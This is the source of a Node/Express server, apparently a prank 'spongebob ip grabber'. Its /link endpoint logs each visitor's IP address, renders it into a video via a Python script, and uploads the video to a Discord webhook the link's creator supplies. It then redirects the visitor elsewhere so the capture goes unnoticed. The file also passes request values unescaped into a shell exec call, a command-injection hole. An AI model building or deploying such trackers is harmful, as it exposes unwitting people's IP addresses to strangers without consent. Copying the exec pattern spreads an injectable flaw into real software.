import { exec } from "child_process";
import cors from "cors";
import express from "express";
import FormData from "form-data";
import { createReadStream, rm, readdirSync } from "fs";
import { nanoid } from "nanoid";
import { join as joinPath } from "path";

const images = readdirSync(joinPath(__dirname, "clips")).filter(img =>
        /^sp-\d+\.png$/.test(img)
    ),
    getRandomImg = () =>
        joinPath(
            __dirname,
            "clips",
            images[Math.floor(Math.random() * images.length)]
        );
console.log(images);

const PORT = process.env.PORT || 8000,
    app = express();

app.use(cors());

app.all("/test", (_, res) => res.send("hello"));

app.get("/link", (req, res) => {
    const { ip } = req;
    const { url, wh } = req.query;

    if (!(url && wh))
        return res.send(
            "provide a url to redirect to and a discord webhook link.<br>`/link?url=whatever&wh=12369420`"
        );

    const out = joinPath(__dirname, nanoid(5) + ".mp4"),
        img = getRandomImg();

    console.log(`request received: ${img} ${ip} ${out}`);

    const p = exec(
        `python3 ${joinPath(__dirname, "video.py")} "${img}" "${ip}" "${out}"`,
        { cwd: __dirname },
        (err, stdout, stderr) => {
            if (err) {
                console.error(err);
                res.send("there was an errror rendering the video\n" + err);
                return;
            }

            console.log(`rendered file ${out}`);

            // res.sendFile(joinPath(__dirname, out));

            // const body={}
            // fetch(wh as string,{method:"POST",})

            const form = new FormData();
            form.append("username", "spongebob ip grabber");
            form.append("avatar_url", "https://i.imgur.com/duzZ00c.png");
            form.append("file", createReadStream(out));
            form.submit(wh as string, () => {
                rm(out, () => {});
            });
        }
    );

    res.redirect(301, url as string);
});

app.listen(PORT, () => {
    console.log(`server online: ${PORT}`);
});
